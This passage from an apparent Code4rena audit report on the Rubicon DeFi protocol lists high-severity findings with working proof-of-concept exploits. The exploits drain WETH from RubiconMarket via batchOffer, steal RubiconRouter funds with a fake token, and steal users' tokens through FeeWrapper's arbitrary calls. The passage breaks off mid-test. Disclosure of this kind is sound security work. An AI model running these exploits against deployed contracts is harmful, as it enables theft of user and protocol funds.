      address alice = 0x0000000000000000000000000000000000000123;
      address bob = 0x0000000000000000000000000000000000000124;

      function setUp() public {
        owner = msg.sender;
        // deploy Comptroller instance
        comptroller = new Comptroller();

        // deploy new Market instance and init
        market = new RubiconMarket();
        market.initialize(FEE_TO);
        market.setFeeBPS(10);

        // deploy test tokens
        TEST = new TokenWithFaucet(address(this), "Test", "TEST", 18);
        TUSDC = new TokenWithFaucet(address(this), "Test Stablecoin", "TUSDC", 6);
        vm.label(address(TEST),"TEST");
        vm.label(address(TUSDC),"TUSDC");

        // baseRate = 0.3, multiplierPerYear = 0.02
        WhitePaperInterestRateModel irModel = new WhitePaperInterestRateModel(3e17, 2e16);
        CErc20Delegate bathTokenImplementation = new CErc20Delegate();

        bathHouse = new BathHouseV2();
        bathHouse.initialize(address(comptroller),address(this));
        bathHouse.createBathToken(address(TEST), irModel, 1e18, address(bathTokenImplementation), "");
        bathHouse.createBathToken(address(TUSDC), irModel, 1e18, address(bathTokenImplementation), "");

        cTEST = CErc20(bathHouse.getBathTokenFromAsset(address(TEST)));
        cTUSDC = CErc20(bathHouse.getBathTokenFromAsset(address(TUSDC)));

        // 1:1 for simplicity
        oracle = new DummyPriceOracle();
        oracle.addCtoken(cTUSDC,1e30);
        oracle.addCtoken(cTEST,1e18);

        comptroller._supportMarket(cTEST);
        comptroller._supportMarket(cTUSDC);
        comptroller._setPriceOracle(oracle);
        comptroller._setCloseFactor(0.5e18); // 0.5 close factor, same as compound mainnet
        comptroller._setLiquidationIncentive(1.08e18); // 8% same as compound mainnet
        comptroller._setCollateralFactor(cTEST,0.7e18);
        comptroller._setCollateralFactor(cTUSDC,0.7e18);

        TEST.mint(address(bob),100e18);
        vm.startPrank(bob);
        TEST.approve(address(cTEST),50e18);
        cTEST.mint(50e18);
        vm.stopPrank();

        // add some $$$ to the Market
        TEST.faucet();
        TUSDC.faucet();
        TEST.approve(address(market), type(uint256).max);
        TUSDC.approve(address(market), type(uint256).max);

        market.offer(100e6, TUSDC, 100e18, TEST);
      }

      function test_LiquidatePositionAfterCreation() public {
        PoolsUtility pools = new PoolsUtility();
        pools.initialize(address(oracle),address(market),address(bathHouse));

        vm.prank(alice);
        pools.createPosition();

        address[] memory positions = pools.getPositions(alice);
        Position position = Position(positions[0]);

        uint256 amount = 10e6;
        TUSDC.mint(alice,amount);
        vm.startPrank(alice);
        TUSDC.approve(address(position),amount);
        position.sellAllAmountWithLeverage(
            address(TUSDC),
            address(TEST),
            amount,
            1e18
        );
        vm.stopPrank();

        (, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(address(position));
        assertEq(0,liquidity);
        // position under water
        assertEq(0,shortfall);

        // next block
        vm.roll(block.number + 1);

        // trigger interest calculation
        uint256 borrowBalance = cTEST.borrowBalanceCurrent(address(position));

        (, liquidity, shortfall) = comptroller.getAccountLiquidity(address(position));
        assertEq(0,liquidity);
        assertGt(shortfall,0);

        // becomes liquidated
        vm.startPrank(bob);
        TEST.approve(address(cTEST),borrowBalance/2);
        cTEST.liquidateBorrow(address(position),borrowBalance/2,cTUSDC);
        vm.stopPrank();
      }
    }

`closeFactor` and `liquidationIncentive` is the same as compound on mainnet.

Added a mint function in the `TokenWithFaucet`:

```solidity
    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }
```

### Tools Used

Manual audit, forge

### Recommended Mitigation Steps

Introduce a safety factor to scale the loans, which the user can provide when opening the `position`.

**[daoio (Rubicon) confirmed via duplicate issue #827](https://github.com/code-423n4/2023-04-rubicon-findings/issues/827#issuecomment-1547185833)**

**[HickupHH3 (judge) increased severity to High and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1180#issuecomment-1549781170):**
 > Selected as best because of the POC, which showcases how the account is subject to liquidation in the next block after leveraging.

***

## [[H-05] RubiconMarket `batchOffer` and `batchRequote` make offers as self; complete loss of funds for some types of tokens, for example WETH](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1052)
*Submitted by [shalaamum](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1052), also found by [nirlin](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1229), [Lirios](https://github.com/code-423n4/2023-04-rubicon-findings/issues/775), [carrotsmuggler](https://github.com/code-423n4/2023-04-rubicon-findings/issues/752), [BGSecurity](https://github.com/code-423n4/2023-04-rubicon-findings/issues/738), [Inspex](https://github.com/code-423n4/2023-04-rubicon-findings/issues/688), [DedOhWale](https://github.com/code-423n4/2023-04-rubicon-findings/issues/646), [Lirios](https://github.com/code-423n4/2023-04-rubicon-findings/issues/624), [tallo](https://github.com/code-423n4/2023-04-rubicon-findings/issues/371), [nobody2018](https://github.com/code-423n4/2023-04-rubicon-findings/issues/291), and [T1MOH](https://github.com/code-423n4/2023-04-rubicon-findings/issues/290)*.

<https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L900> <br><https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L926>

The `RubiconMarket` functions `batchOffer` and `batchRequote` both contain calls to `offer` as follows:

```Solidity
this.offer(
    payAmts[i],
    ERC20(payGems[i]),
    buyAmts[i],
    ERC20(buyGems[i])
);
```

But calling `offer` using `this.offer` will [use a message call instead of a jump](https://docs.soliditylang.org/en/v0.8.19/control-structures.html#function-calls). This means that in `offer`, the value of `msg.sender` will be the address of the `RubiconMarket` contract, not of the original sender. Hence, the offer will be made by the `RubiconMarket` itself.

An attacker can use this to make `RubiconMarket` offer all its balance of a particular token (possibly in exchange for a token the attacker created, at effectively zero cost), with the attacker then taking the offer and thereby stealing `RubiconMarket`'s entire balance for that token.

For this attack to work, the `RubiconMarket` must be able to actually make the offer itself; the crucial condition here is in [line 538](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/RubiconMarket.sol#L538).

```Solidity
require(pay_gem.transferFrom(msg.sender, address(this), pay_amt));
```

In the `offer` function of `SimpleMarket`, it must not revert if this call is made by the `RubiconMarket` contract and `msg.sender` is *also* the same contract, even though `RubiconMarket` did not approve a transfer to itself.

Whether this condition is satisfied will depend on the token.
For example, in the [standard ERC20 token contract by OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol), this condition is not satisfied. However, in the [WETH contract](https://optimistic.etherscan.io/address/0x4200000000000000000000000000000000000006#code), the check in the `transferFrom` function is.

```Solidity
if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {
    require(allowance[src][msg.sender] >= wad);
    allowance[src][msg.sender] -= wad;
}
```

If the caller is also the `src`, then it is not necessary to approve the transfer beforehand. This means the vulnerability outlined above can be used to drain all WETH held by a `RubiconMarket`, and possibly the balance in other tokens where `transferFrom` is implemented similarly.

### Proof of Concept

After applying the diff below, run:

    npx hardhat test --grep "ShalaamumMarketThis"

To run the POC, the output should contain the following:

      Rubicon v2 Protocol Tests
        ShalaamumMarketThis
          ✓ Initialized Market
          ✓ attacker has 1 ETH and 0 WETH
          ✓ attacker deploys own attackerCoin
          ✓ rubiconMarket holds 10 WETH
          ✓ Attacker exploiting vulnerability and making market offer assets held in escrow
          ✓ Attacker taking offer
          ✓ rubiconMarket holds 0 WETH
          ✓ attacker holds 10 WETH

The POC demonstrates how an attacker can deploy their own token and then use `batchOffer` to make the `RubiconMarket` offer its entire balance of WETH for some of the attacker's token. The attacker then takes that offer at no cost (except some gas) and thereby steals the `10 WETH` the `RubiconMarket` held in escrow for previous unfilled offers.

### Files to change

Apply the following diff to `test/hardhat-tests/ProtocolDeployment.ts`:

```diff
diff --git a/test/hardhat-tests/ProtocolDeployment.ts b/test/hardhat-tests/ProtocolDeployment.ts
index b55d879..0b8e6ba 100644
--- a/test/hardhat-tests/ProtocolDeployment.ts
+++ b/test/hardhat-tests/ProtocolDeployment.ts
@@ -1,4 +1,4 @@
-import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
+import { time, loadFixture, setBalance } from "@nomicfoundation/hardhat-network-helpers";
 import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
 import { expect } from "chai";
 import { ethers, network } from "hardhat";
@@ -213,6 +213,77 @@ describe("Rubicon v2 Protocol Tests", function () {
     };
   }
 
+  describe("ShalaamumMarketThis", function () {
+    let rubiconMarket, weth, attacker;
+    let attackerCoin;
+    const attackerBalanceStart = 10n**18n;
+    let marketWethStart;
+  
+    before(async function () {
+      let otherAccount;
+      ({ rubiconMarket, weth, otherAccount } = await loadFixture(
+        deployRubiconProtocolFixture
+      ));
+      attacker = otherAccount;
+    });
+  
+    it("Initialized Market", async function () {
+      expect(await rubiconMarket.initialized()).to.equal(true);
+    });
+
+    it("attacker has 1 ETH and 0 WETH", async function () {
+      setBalance(attacker.address, attackerBalanceStart);
+      expect(await ethers.provider.getBalance(attacker.address)).eq(attackerBalanceStart);
+      expect(await weth.balanceOf(attacker.address)).eq(0);
+    });
+
+    it("attacker deploys own attackerCoin", async function () {
+      const testCoinFactory = await ethers.getContractFactory("TokenWithFaucet", attacker);
+      attackerCoin = await testCoinFactory.deploy(
+        attacker.address,
+        "AttackerCoin",
+        "ATTACKCOIN",
+        18
+      );
+      await attackerCoin.connect(attacker).adminMint();
+      expect(await attackerCoin.balanceOf(attacker.address)).to.be.gte(1);
+    });
+
+    it("rubiconMarket holds 10 WETH", async function () {
+      marketWethStart = await weth.balanceOf(rubiconMarket.address);
+      expect(marketWethStart).eq(10n*10n**18n);
+    });
+
+    it("Attacker exploiting vulnerability and causing market to offer assets held in escrow", async function () {
+      await rubiconMarket.connect(attacker).batchOffer(
+        [marketWethStart],
+        [weth.address],
+        [1],
+        [attackerCoin.address]
+      );
+    });
+
+    it("Attacker taking offer", async function () {
+      let lastOfferId = await rubiconMarket.last_offer_id();
+      await attackerCoin.connect(attacker).approve(
+        rubiconMarket.address,
+        1
+      )
+      await rubiconMarket.connect(attacker).buy(
+        lastOfferId,
+        marketWethStart.mul(10000).div(9999)
+      );
+    });
+
+    it("rubiconMarket holds 0 WETH", async function () {
+      expect(await weth.balanceOf(rubiconMarket.address)).eq(0);
+    });
+
+    it("attacker holds 10 WETH", async function () {
+      expect(await weth.balanceOf(attacker.address)).eq(10n*10n**18n);
+    });
+  });
+
   describe("Protocol Tests", async function () {
     // *** Core ***
     describe("Rubicon Market", function () {
```

### Mitigation

Change `this.offer` to `offer`. As the `offer` function is currently `external`, it will have to be changed to `public`.

**[bghughes (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1052#issuecomment-1511506135)**

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1052#issuecomment-1577820928):**
 > - Satisfactory: How funds can be drained for token implementations that skip approvals when `src` is `msg.sender` / `src` == `dest`.
> - 50%: Reverting txns from insufficient token approval.

***

## [[H-06] Position doesn't distribute rewards to users](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1021)
*Submitted by [Ruhum](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1021), also found by [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1189), [John](https://github.com/code-423n4/2023-04-rubicon-findings/issues/758) and [rvierdiiev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/682)*.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L350-L379> <br><https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L271-L277> <br><https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/BathHouseV2.sol#L113-L128>

In `Compound V2`, both borrowers and suppliers are eligible to earn rewards. The `Position` contract allows users to create long/short positions for each market. For that, it both supplies and borrows tokens from a compound market. So while the user is the one who provided the initial tokens to open up a position, it's the `Position` contract that holds the `cTokens` that earn the rewards. These rewards are not distributed to position owners. Instead, they are locked up as the `Position` contract never claims them. That also means that anybody else who uses the market has their rewards diluted.

### Proof of Concept

Whenever `cTokens` are minted, transferred or burned, the `Comptroller` is notified to distribute rewards. When `cTokens` are minted, `mintFresh()` triggers [`Comptroller.mintAllowed()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/CToken.sol#L400) which distributes rewards through [`distributeSupplierComp()`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/Comptroller.sol#L322).

```sol
    // CToken.sol
    function mintFresh(address minter, uint mintAmount) internal {
        /* Fail if mint not allowed */
        uint allowed = comptroller.mintAllowed(address(this), minter, mintAmount);
        // ...
    }

    // Comptroller.sol
    function mintAllowed(
        address cToken,
        address minter,
        uint mintAmount
    ) external override returns (uint) {
        // Pausing is a very serious situation - we revert to sound the alarms
        require(!mintGuardianPaused[cToken], "mint is paused");

        // Shh - currently unused
        minter;
        mintAmount;

        if (!markets[cToken].isListed) {
            return uint(Error.MARKET_NOT_LISTED);
        }

        // Keep the flywheel moving
        updateCompSupplyIndex(cToken);
        distributeSupplierComp(cToken, minter);

        return uint(Error.NO_ERROR);
    }
```

The `Position` contract supplies and borrows tokens from the market when opening up a new position or updating an existing one:

```sol
    /// @notice borrow `_amount` of underlying token of `_cToken`
    function _borrow(address _cToken, uint256 _amount) internal {
        require(
            CErc20Interface(_cToken).borrow(_amount) == 0,
            "_borrow: BORROW FAILED"
        );
    }

    function _supply(
        address _token,
        address _bathToken,
        uint256 _amount
    ) internal returns (uint256 _bathTokenAmount) {
        uint256 _initBathTokenAmount = IERC20(_bathToken).balanceOf(
            address(this)
        );
        IERC20(_token).safeApprove(_bathToken, _amount);
        require(
            CErc20Interface(_bathToken).mint(_amount) == 0,
            "_supply: MINT FAILED"
        );
        uint256 _currentBathTokenAmount = IERC20(_bathToken).balanceOf(
            address(this)
        );

        assembly {
            switch _initBathTokenAmount
            case 0 {
                _bathTokenAmount := _currentBathTokenAmount
            }
            default {
                _bathTokenAmount := sub(
                    _currentBathTokenAmount,
                    _initBathTokenAmount
                )
            }
        }
    }
```

In `BathHouseV2` we can see that the protocol expects to use the `Comptroller` rewards mechanism. It calls `claimComp()` to harvest those rewards for the caller:

```sol
    /// @notice claim available rewards
    /// across all the pools
    function claimRewards(
        address[] memory buddies,
        address[] memory rewardsTokens
    ) external {
        // claim rewards from comptroller
        comptroller.claimComp(msg.sender);
        // get rewards from bathBuddy
        for (uint256 i = 0; i < buddies.length; ++i) {
            IBathBuddy(buddies[i]).getReward(
                IERC20(rewardsTokens[i]),
                msg.sender
            );
        }
    }
```

To claim the rewards, the `Position` contract also has to call `claimComp()`, but it never does. Thus, the rewards are accrued to the `Position` contract but never claimed.

### Recommended Mitigation Steps

The Position contract has to distribute rewards to users.

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1021#issuecomment-1534073364)**

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1021#issuecomment-1577802453):**
 > Considering this to be High severity because of certain and total loss of yield without additional requirements.

***

## [[H-07] Wrong calculation of repayment amount in Position contract](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1003)
*Submitted by [Toshii](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1003), also found by [immeas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1185) and [0xDING99YA](https://github.com/code-423n4/2023-04-rubicon-findings/issues/959)*.

<https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L282> <br><https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L82> <br><https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L329-L331> <br><https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L87>

When a user calls `closePosition(..)` -> `_repay(..)` on the `Position` contract, the function `borrowBalanceOfPos(..)` is used to calculate the amount that the user needs to repay. This repayment amount is equivalent to the amount the user borrowed (`_borrowedAmount`) plus their interest (`_interest`). To calculate this interest portion, the function multiplies the current `borrowRate` by the difference in number of blocks between when the user created the position and the current block timestamp. The issue arises because the `borrowRate` over the entire duration of the borrow is defined as: `rate = CTokenInterface(bathToken).borrowRatePerBlock();`. However, `borrowRatePerBlock()` is a function of total borrows and total supply for the `cToken`; thus, is not required to be the same over the entire duration of when the user takes it out of their position. This means the calculated repayment amount can potentially overshoot/undershoot the actual amount.

### Proof of Concept

Steps:
1. Bob uses the `Position` contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function. This results in an increased borrow interest rate.
2. Later, Alice also uses the `Position` contract to open a leveraged position using the `buyAllAmountWithLeverage(..)` function. This again results in an increased borrow interest rate.
3. Bob calls `closePosition(..)`, where the call to `_repay(..)` references the current `borrowRatePerBlock()`, which prices Bob's interest at the rate which includes Bob and Alice's borrows.

This results in excess `asset` being swapped to `quote`, rather than what is needed for repayment.

### Recommended Mitigation Steps

Potentially keep track of changes in the supply/borrow state. However, this might not be worth the tradeoff in increased gas.

**[daoio (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1003#issuecomment-1534074919)**

**[HickupHH3 (judge) increased severity to High and commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1003#issuecomment-1560368752):**
 > Incorrect interest calculation, consider this to be high severity because it affects repay amount.

***

## [[H-08] An attacker can steal all `RubiconRouter` funds](https://github.com/code-423n4/2023-04-rubicon-findings/issues/770)
*Submitted by [CryptoCraze](https://github.com/code-423n4/2023-04-rubicon-findings/issues/770)*.

An attacker can steal all funds in `RubiconRouter` by abusing an error in the token to repay the user in the functions `maxBuyAllAmount` and `maxSellAllAmount` (and possibly others).

Please note that the vulnerability exists in [the version of `RubiconRouter` in production](https://optimistic.etherscan.io/address/0x7af14adc8aea70f063c7ea3b2c1ad0d7a59c4bff) and was missed in the C4 audit for Rubicon v1.

### Proof of Concept

The function `maxBuyAllAmount` is used to allow a user to trade using their entire balance of `buy_gem`. The user [transfers the funds to the router](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L348) and then `RubiconMarket` is used to find the best offers and execute them. After the trades are performed, the router intends to forward the resulting amount back to the user. Due to a bug, the token used for this transfer is `buy_gem` again, *instead* of `pay_gem` as seen [in the same function](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355).

This mismatch allows an attacker to steal all funds stored in the router using the following steps:

1.  Create a fake token (which only the attacker can mint).
2.  Call `approveAssetOnMarket` with the fake token indirectly. This can be done by trading with ETH and the fake token (e.g. by using `offerWithETH` and `buyAllAmountForETH`). Without this step, all calls to `maxBuyAllAmount` will fail because it doesn't approve new tokens. We suspect this is partly the reason this was missed by the test and wasn't used in production.
3.  Offer a small amount of a real token (e.g. USDC) for a large amount of the fake token.
4.  Transfer the fake token to the router so it can buy the offer.
5.  Buy the offer using `maxBuyAllAmount` and receive the funds in the real token (e.g. USDC) instead of the fake token.

Attached is a POC which performs this flow:

For this POC, please include the following lines in `ProtocolDeployment.t.sol`:

```solidity
import "../../contracts/utilities/RubiconRouter.sol";
import "forge-std/StdUtils.sol";
```

The exploit is performed by the following function:

```solidity
  function test_WithRouter() public {
    RubiconRouter router = new RubiconRouter();
    router.startErUp(address(market), payable(address(WETH)));

    address attacker = 0x000000000000000000000000000000000000dACa;
    uint256 routerBalance = 1e10;
    deal(address(TUSDC), address(router), routerBalance); // Set this to simulate current router balance
    deal(address(TUSDC), attacker, 1+1);
    vm.deal(attacker, 1 ether);

    vm.startPrank(attacker);

    // create fake coin which only attacker can mint
    TokenWithFaucet FAKE = new TokenWithFaucet(attacker, "Fake", "FAKE", 18);
    FAKE.adminMint();

    FAKE.approve(address(market), type(uint256).max);
    TUSDC.approve(address(market), type(uint256).max);
    FAKE.approve(address(router), type(uint256).max);
    TUSDC.approve(address(router), type(uint256).max);

    // Create approval for fake coin (otherwise market will not be able to transfer fake coins from router)
    router.offerWithETH{value: 1}(1 /* ETH */, 1, FAKE, 0, attacker);
    router.buyAllAmountForETH(1, FAKE, 1);

    // Assume TEST is a fake token only attacker can mint
    uint256 fees = (routerBalance * (market.getFeeBPS() + market.makerFee())) / 100_000;
    market.offer(1, TUSDC, routerBalance, FAKE, 0, attacker, attacker); // offer 1 usdc for a lot of fake coin

    assertEq(TUSDC.balanceOf(attacker), 1);

    FAKE.transfer(address(router), routerBalance + fees); // give router fake coins so it can buy the offer
    router.maxBuyAllAmount(TUSDC, FAKE, type(uint256).max); // pay 1 usdc for a lot of usdc instead of fake coin (because of the vulnerability)

    assertGt(TUSDC.balanceOf(attacker), 1);
    console.log(TUSDC.balanceOf(attacker));
  }
```

The output of this test shows that funds were stolen from the router:

```shell
Running 1 test for test/foundry-tests/ProtocolDeployment.t.sol:ProtocolDeploymentTest
[PASS] test_WithRouter() (gas: 5216320)
Logs:
  9999000000

Test result: ok. 1 passed; 0 failed; finished in 20.86ms
```

### Recommended Mitigation Steps

The final transfers in `maxBuyAllAmount` and `maxSellAllAmount` (see [RubiconRouter.sol#L355](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355) and [RubiconRouter.sol#L374](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L374)) should use `pay_gem` instead of `buy_gem`.

**[bghughes (Rubicon) confirmed](https://github.com/code-423n4/2023-04-rubicon-findings/issues/770#issuecomment-1533734785)**

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/770#issuecomment-1576370154):**
 > Valid, but the router's OOS.
> 
> I'm on the fence for disqualifying it as it should be awarded separately from the audit, but there doesn't seem to be a bug bounty program. Will include it unless the sponsor decides to give a separate reward.

***

## [[H-09] An attacker can steal all tokens of users that use `FeeWrapper`](https://github.com/code-423n4/2023-04-rubicon-findings/issues/767)
*Submitted by [CryptoCraze](https://github.com/code-423n4/2023-04-rubicon-findings/issues/767), also found by [adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1284), [kaden](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1129), [sashik\_eth](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1015), [0xfusion](https://github.com/code-423n4/2023-04-rubicon-findings/issues/891), [0xDING99YA](https://github.com/code-423n4/2023-04-rubicon-findings/issues/855), [parlayan\_yildizlar\_takimi](https://github.com/code-423n4/2023-04-rubicon-findings/issues/782), [fs0c](https://github.com/code-423n4/2023-04-rubicon-findings/issues/737), [xmxanuel](https://github.com/code-423n4/2023-04-rubicon-findings/issues/693), [Inspex](https://github.com/code-423n4/2023-04-rubicon-findings/issues/687), [sinarette](https://github.com/code-423n4/2023-04-rubicon-findings/issues/671), [0xNineDec](https://github.com/code-423n4/2023-04-rubicon-findings/issues/643), [Banditx0x](https://github.com/code-423n4/2023-04-rubicon-findings/issues/538), [nobody2018](https://github.com/code-423n4/2023-04-rubicon-findings/issues/292), [ladboy233](https://github.com/code-423n4/2023-04-rubicon-findings/issues/264), [azhar](https://github.com/code-423n4/2023-04-rubicon-findings/issues/209) and [orion](https://github.com/code-423n4/2023-04-rubicon-findings/issues/138)*.

An attacker can steal all tokens of users that use `FeeWrapper`.

### Proof of Concept

There is no way to distinguish between users that use `FeeWrapper`. For example, if a user called `RubiconRouter`
through the `FeeWrapper`, then the `msg.sender` in `RubiconRouter` would be the address of `FeeWrapper`, instead
of the address of the user. This will cause all offers to be owned by `FeeWrapper`.

This means that a malicious attacker can call `FeeWrapper` and impersonate another user, then withdraw their tokens
on their behalf. Here is an example of the flow of events that could occur:

1.  A victim sends their token to some 3rd party that uses the `FeeWrapper` to call `Rubicon` contracts.
    *   The 3rd party creates an offer through the `FeeWrapper`.
2.  A malicious attacker calls the `FeeWrapper` directly, and cancels the offer the victim created. The tokens are returned to the `FeeWrapper`.
3.  The attacker calls the `FeeWrapper` again, this time calling `transfer`, to transfer all the tokens from the `FeeWrapper` into the attacker's account.

As seen in the `FeeWrapper`, it's possible for anyone to make the `FeeWrapper` call any function of any contract with any arguments, through [rubicall](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L66). For example, we can call `offer` and `cancel` (of `RubiconMarket`) and even `transfer`/`transferFrom` (of any ERC20 token) on its behalf.

### Exploit 1 - 3rd party calls `RubiconMarket` through the `FeeWrapper`

This exploit has a victim and an attacker, the victim invests his tokens through some 3rd party that uses the `FeeWrapper`
by creating an offer. Then the attacker calls the `FeeWrapper` directly, and cancels the victim's offer, taking all his
tokens.

We modified the `fee-wrapper.ts` test. The setup is almost identical, only we added a `victim` and an `attacker`, and
modified the `pepeFinance` to use our example 3rd party.

```
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { parseUnits } from "ethers/lib/utils";
import { ethers } from "hardhat";
const { expect } = require("chai");

describe("Fee Wrapper", function () {
  const FEE_TO = "0x0000000000000000000000000000000000000FEE";

  async function deployRubiProtocolFixture() {
    // Contracts are deployed using the first signer/account by default
    const [owner, otherAccount, testMaker, attacker, victim] = await ethers.getSigners();

    const WETH = await ethers.getContractFactory("WETH9");
    const weth = await WETH.deploy();

    const testCoinFactory = await ethers.getContractFactory("TokenWithFaucet");
    const testCoin = await testCoinFactory.deploy(
      owner.address,
      "Test",
      "TEST",
      18
    );
    const testStableCoin = await testCoinFactory.deploy(
      owner.address,
      "Test Stablecoin",
      "TUSDC",
      6
    );

    const ComptrollerFactory = await ethers.getContractFactory("Comptroller");
    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?

    const interestRateModelFacStory = await ethers.getContractFactory(
      "WhitePaperInterestRateModel"
    );

    // Inputs
    const baseRatePerYear = parseUnits("0.3"); //  TODO: WHAT SHOULD THIS BE?
    const multiplierPerYear = parseUnits("0.02"); //  TODO: WHAT SHOULD THIS BE?
    const irModel = await interestRateModelFactory.deploy(
      baseRatePerYear,
      multiplierPerYear
    );

    const cTokenFactory = await ethers.getContractFactory("CErc20Delegate");
    const cTokenImplementation = await cTokenFactory.deploy();

    // Initialize the market
    const underlying = testCoin.address;
    const interestRateModel = irModel.address;
    const initialExchangeRateMantissa = "200000000000000000000000000"; // TODO: What should this be?
    const name = "Test Bath Token"; // TODO: move this process to Bath House factory
    const symbol = "bathTEST";
    const decimal = 18;

    const becomeImplementationData = "0x"; //TODO: What should this be?

    const cTokenDelegatorFactory = await ethers.getContractFactory(
      "CErc20Delegator"
    );

    const cWETH = await cTokenDelegatorFactory
      .deploy(
        weth.address,
        comptroller.address,
        interestRateModel,
        initialExchangeRateMantissa,
        "WETH",
        "WETH",
        decimal,
        owner.address, // Admin!
        cTokenImplementation.address,
        becomeImplementationData
      )
      .catch((e) => {
        console.log("\nError deploying cWETH!", e.reason, "\n");
      });
    await comptroller._supportMarket(cWETH!.address).catch((e: any) => {
      console.log("\nError supporting new cToken market!", e.reason, "\n");
    });

    const RubiconMarketFactory = await ethers.getContractFactory(
      "RubiconMarket"
    );
    const rubiconMarket = await RubiconMarketFactory.deploy();
    await rubiconMarket.initialize(testMaker.address);
    await rubiconMarket.setFeeBPS(10);

    // Make a liquid ERC-20 pair for testCoin and testStableCoin. Bid at $90 ask at $110.
    await testCoin.connect(owner).faucet();
    await testStableCoin.connect(owner).faucet();

    await testCoin.connect(owner).transfer(victim.address, parseUnits("999"));

    await testCoin!
      .connect(owner)
      .approve(rubiconMarket.address, parseUnits("1000"));
    await testStableCoin!
      .connect(owner)
      .approve(rubiconMarket.address, parseUnits("1000"));

    await rubiconMarket.functions["offer(uint256,address,uint256,address)"](
      parseUnits("90", 6),
      testStableCoin.address,
      parseUnits("100"),
      testCoin.address,
      { from: owner.address }
    );
    await rubiconMarket.functions["offer(uint256,address,uint256,address)"](
      parseUnits("100"),
      testCoin.address,
      parseUnits("110", 6),
      testStableCoin.address,
      { from: owner.address }
    );

    const RubiconRouter = await ethers.getContractFactory("RubiconRouter");
    const router = await RubiconRouter.deploy();
    await router.startErUp(rubiconMarket.address, weth.address);

    // fee wrapper
    const FeeWrapper = await ethers.getContractFactory("FeeWrapper");
    const feeWrapper = await FeeWrapper.deploy();

    // 3rd party protocol
    const PepeFinance = await ethers.getContractFactory("Some3rdPartyProtocol");
    const pepeFinance = await PepeFinance.deploy(
      feeWrapper.address,
      FEE_TO,
      rubiconMarket.address
    );

    await testCoin!.connect(owner).approve(router.address, parseUnits("320"));

    return {
      rubiconMarket,
      testCoin,
      owner,
      otherAccount,
      testStableCoin,
      weth,
      cWETH,
      router,
      feeWrapper,
      pepeFinance,
      attacker,
      victim
    };
  }
  it("Exploit steal all tokens from offers created with the `FeeWrapper`", async function () {
    const { testCoin, testStableCoin, pepeFinance, rubiconMarket, feeWrapper, attacker, victim } = await loadFixture(
      deployRubiProtocolFixture
    );

    let victimBalance = Number(await testCoin.balanceOf(victim.address))
    console.log("The victim has a lot of tokens. Victim's balance = ", victimBalance)

    // Victim puts all his hard-earned money into an offer
    let pay_amt = testCoin.balanceOf(victim.address);
    await testCoin
      .connect(victim)
      .approve(pepeFinance.address, pay_amt);
    await pepeFinance.connect(victim).executeOffer(
      pay_amt,
      testCoin.address,
      parseUnits("110"),
      testStableCoin.address,
      0
    );
    // This is the 3rd offer, hence it would get and ID of 3
    const victimOfferId = 3;

    let attackerBalance = Number(await testCoin.balanceOf(attacker.address))
    console.log("Before attack attacker has no tokens. Attacker's balance = ", attackerBalance)


    let ABI = [
      "function cancel(uint256 id)",
      "function transfer(address to, uint256 amount)"
    ];
    let iface = new ethers.utils.Interface(ABI);

    // The attaacker calls `cancel` through the `FeeWrapper`.
    // This steals the victim's tokens and puts them into the FeeWrapper
